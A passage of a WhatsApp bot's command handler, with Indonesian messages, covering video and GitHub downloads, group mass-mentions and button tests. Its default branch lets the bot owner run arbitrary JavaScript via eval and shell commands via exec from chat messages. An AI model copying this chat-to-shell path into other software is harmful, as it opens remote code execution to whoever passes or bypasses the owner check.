    await sock.sendMessage(m.chat, { text: "Mendownload video...", edit: loadMsg.key });
    
    const api = `https://piereeapi.vercel.app/download/ytmp4?url=${encodeURIComponent(url)}`;
    const response = await fetch(api);
    const data = await response.json();
    
    if (!data.status) throw new Error("Gagal mendownload video");
    
    const caption = `╭─────────────
│ Title: ${data.result.title}
│ Type: MP4
╰─────────────`;
    
    const videoResponse = await fetch(data.result.download);
    const videoBuffer = await videoResponse.arrayBuffer();
    
    await sock.sendMessage(m.chat, { text: "Mengirim video...", edit: loadMsg.key });
    
    await sock.sendMessage(m.chat, {
      video: Buffer.from(videoBuffer),
      caption: caption,
      mimetype: 'video/mp4'
    }, { quoted: m });
    
    await sock.sendMessage(m.chat, { delete: loadMsg.key });
    
  } catch (err) {
    console.error(err);
    m.reply(`Gagal mendownload video:\n${err.message || String(err)}`);
  }
}
break;

case "tagall": {
    if (!m.isGroup) return m.reply("Khusus grup");
    if (!text) return m.reply(example("teksnya"))
    let groupMetadata = await sock.groupMetadata(m.chat);
    let members = groupMetadata.participants;

    await sock.sendMessage(m.chat, {
        text: text,
        mentions: members.map(v => v.id)
    });
}
break;

case "hidetag": {
    if (!m.isGroup) return m.reply("Khusus grup");
    if (!text) return m.reply(example("Tulis pesannya"));

    let meta = await sock.groupMetadata(m.chat);
    let members = meta.participants.map(v => v.id);

    await sock.sendMessage(m.chat, {
        text: text,   
        mentions: members
    });
}
break;

case 'github':
case 'githubdl': {
   if (!text) return m.reply(example('Link GitHub'));

   try {
      const axios = require('axios');
      const fetchUrl = `https://api.siputzx.my.id/api/d/github?url=${encodeURIComponent(text)}`;

      let load = await sock.sendMessage(m.chat, { text: '⏳ Sedang memproses...' }, { quoted: m });

      await sock.sendMessage(m.chat, {
         edit: load.key,
         text: '📦 Mengambil ZIP...'
      });

      const { data } = await axios.get(fetchUrl, { responseType: 'arraybuffer' });

      await sock.sendMessage(m.chat, {
         edit: load.key,
         text: '✅ Selesai! Mengirim file...'
      });


      await sock.sendMessage(m.chat, {
         document: data,
         mimetype: 'application/zip',
         fileName: 'github_repo.zip',
         contextInfo: {
            externalAdReply: {
               title: "GitHub Downloader",
               body: "ZIP Siap Didownload",
               thumbnailUrl: "https://files.catbox.moe/f94etm.jpg",
               sourceUrl: text,
               mediaType: 1,
               renderLargerThumbnail: true,
               showAdAttribution: true
            }
         }
      }, { quoted: m });

   } catch (e) {
      console.log(e);
      sock.sendMessage(m.chat, { edit: load.key, text: '❌ Gagal mengambil ZIP.' }, { quoted: m });
   }
}
break;

case 'btn1': {
  await sock.sendMessage(m.chat, {
    interactiveMessage: {
      body: { text: "Tes tombol basic." },

      nativeFlowMessage: {
        buttons: [
          { name: "quick_reply", buttonParamsJson: '{"display_text":"Quick Reply","id":"qr"}' },
          { name: "cta_url", buttonParamsJson: '{"display_text":"Website","url":"https://example.com"}' },
          { name: "cta_call", buttonParamsJson: '{"display_text":"Call","phone_number":"+628123"}' },
          { name: "cta_copy", buttonParamsJson: '{"display_text":"Copy","copy_code":"BEW-1"}' },
          {
            name: "catalog_message",
            buttonParamsJson: JSON.stringify({
              title: "Buka Katalog"
            })
          },
        ]
      }
    }
  })
}
break

case 'btn2': {
  await sock.sendMessage(m.chat, {
    interactiveMessage: {
      header: {
        title: "TEST CTA BUTTON"
      },
      body: {
        text: "Tes tombol Payment & Signup."
      },

      nativeFlowMessage: {
        buttons: [
          // CTA SIGNUP
          {
            name: "cta_signup",
            buttonParamsJson: JSON.stringify({
              display_text: "Daftar Akun",
              signup_link: "https://contoh.com/signup" // WAJIB ADA LINK!
            })
          },

          // CTA PAYMENT
          {
            name: "cta_payment",
            buttonParamsJson: JSON.stringify({
              display_text: "Bayar Sekarang",
              amount: 50000,      // angka, bukan string
              currency: "IDR",
              payment_link: "https://contoh.com/pay" // WAJIB ADA LINK!
            })
          },

          // ADD TO CART
          {
            name: "add_to_cart",
            buttonParamsJson: JSON.stringify({
              display_text: "Tambah ke Keranjang",
              product_id: "PRODUCT_ID_1"
            })
          }
        ],

        messageParamsJson: "{}"
      }
    }
  })
}
break

//==================================//

default:
if (m.text.toLowerCase().startsWith("xx ")) {
  if (!isCreator) return;
  try {
    const r = await eval(`(async()=>{${text}})()`);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.toLowerCase().startsWith("x ")) {
  if (!isCreator) return;
  try {
    let r = await eval(text);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.startsWith('$')) {
  if (!isCreator) return;
  exec(m.text.slice(2), (e, out) =>
    sock.sendMessage(m.chat, { text: util.format(e ? e : out) }, { quoted: m })
  );
}}



//==================================//

} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.white("[•] Update"), chalk.white(`${__filename}\n`))
delete require.cache[file]
require(file)
})
